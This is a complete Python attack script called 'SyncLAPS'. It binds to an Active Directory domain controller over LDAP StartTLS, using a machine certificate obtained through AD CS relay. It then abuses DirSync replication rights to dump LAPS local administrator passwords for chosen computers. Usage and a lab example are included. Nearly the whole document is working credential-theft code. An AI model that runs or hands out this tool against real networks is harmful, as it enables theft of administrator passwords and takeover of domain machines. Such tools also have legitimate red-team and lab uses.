#!/usr/bin/env python3
# SyncLAPS — DirSync-based LAPS reader over LDAP + StartTLS with
# client-certificate (Schannel) authentication.
#
# Abuses DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set
# (BloodHound "SyncLAPSPassword" edge) to pull ms-Mcs-AdmPwd / msLAPS-Password
# without PKINIT — when all you have is a machine certificate (e.g. obtained
# via ESC8 / Certighost-style AD CS relay) and Kerberos PKINIT is unavailable.
#
# Requires: pip install ldap3
#
# Usage:
#   python3 sync_laps.py <DC_IP> <BASE_DN> <CERT> <KEY> [LDAP_FILTER]
#
# Example (lab):
#   python3 sync_laps.py 192.168.56.10 "DC=lab,DC=local" dc01.crt dc01.key "(sAMAccountName=WS01$)"

import sys
import ssl
from ldap3 import Server, Connection, Tls, SUBTREE, SASL, EXTERNAL, AUTO_BIND_NO_TLS

# LDAP_SERVER_DIRSYNC_OID
DIRSYNC_OID = "1.2.840.113556.1.4.841"
# For reading filtered-attribute-set values (like ms-Mcs-AdmPwd) with
# GetChanges + GetChangesInFilteredSet, use flags=0 (plain incremental DirSync).
# The OBJECT_SECURITY flag (0x1) changes the rights check and suppresses the
# filtered attribute, so we default to 0 and allow override via env for testing.
import os
DIRSYNC_FLAGS = int(os.environ.get("DIRSYNC_FLAGS", "0"))

LAPS_ATTRS = ["ms-Mcs-AdmPwd", "msLAPS-Password", "sAMAccountName",
              "ms-Mcs-AdmPwdExpirationTime"]


def encode_dirsync_value(flags, max_bytes=0, cookie=b""):
    # controlValue ::= SEQUENCE { flags INTEGER, maxBytes INTEGER, cookie OCTET STRING }
    def enc_len(n):
        if n < 0x80:
            return bytes([n])
        b = []
        while n:
            b.insert(0, n & 0xFF)
            n >>= 8
        return bytes([0x80 | len(b)]) + bytes(b)

    def enc_int(v):
        if v == 0:
            body = b"\x00"
        else:
            body = []
            n = v
            while n:
                body.insert(0, n & 0xFF)
                n >>= 8
            if body[0] & 0x80:
                body.insert(0, 0)
            body = bytes(body)
        return b"\x02" + enc_len(len(body)) + body

    def enc_octet(v):
        return b"\x04" + enc_len(len(v)) + v

    seq = enc_int(flags) + enc_int(max_bytes) + enc_octet(cookie)
    return b"\x30" + enc_len(len(seq)) + seq


def main():
    if len(sys.argv) < 5:
        print(__doc__)
        sys.exit(1)

    dc_ip = sys.argv[1]
    base_dn = sys.argv[2]
    cert = sys.argv[3]
    key = sys.argv[4]
    ldap_filter = sys.argv[5] if len(sys.argv) > 5 else "(&(objectClass=computer))"

    # AD accepts SASL EXTERNAL (client-cert mapping) ONLY over port 389 + StartTLS,
    # NOT over LDAPS/636. So: plain 389, upgrade with StartTLS presenting the client
    # cert, then SASL EXTERNAL bind. This is pure Schannel, no Kerberos/PKINIT.
    tls = Tls(local_certificate_file=cert,
              local_private_key_file=key,
              validate=ssl.CERT_NONE)
    server = Server(dc_ip, port=389, use_ssl=False, tls=tls, get_info=None)

    conn = Connection(server,
                      authentication=SASL,
                      sasl_mechanism=EXTERNAL,
                      auto_bind=False)
    print(f"[*] Connecting to ldap://{dc_ip}:389 ...")
    try:
        conn.open()
    except Exception as ex:
        print(f"[-] open() raised: {ex}")
        sys.exit(1)
    print("[*] Socket open. Sending StartTLS with client certificate ...")
    try:
        if not conn.start_tls():
            print(f"[-] StartTLS failed: {conn.result}")
            sys.exit(1)
    except Exception as ex:
        print(f"[-] StartTLS raised: {ex}")
        sys.exit(1)
    print("[*] StartTLS ok. Binding with SASL EXTERNAL (cert mapping) ...")
    try:
        ok = conn.bind()
    except Exception as ex:
        print(f"[-] bind() raised: {ex}")
        sys.exit(1)
    if not ok:
        print(f"[-] Bind failed: {conn.result}")
        sys.exit(1)
    print(f"[+] Bound. whoami: {conn.extend.standard.who_am_i()}")

    ctrl_value = encode_dirsync_value(DIRSYNC_FLAGS)
    controls = [(DIRSYNC_OID, True, ctrl_value)]

    print(f"[*] DirSync search  base={base_dn}  filter={ldap_filter}")
    conn.search(search_base=base_dn,
                search_filter=ldap_filter,
                search_scope=SUBTREE,
                attributes=LAPS_ATTRS,
                controls=controls)

    if not conn.entries:
        print("[-] No entries returned. Check the filter / that the target has LAPS set.")
        print(f"    raw result: {conn.result}")
        sys.exit(0)

    for e in conn.entries:
        print("-" * 50)
        print(e)

    conn.unbind()


if __name__ == "__main__":
    main()
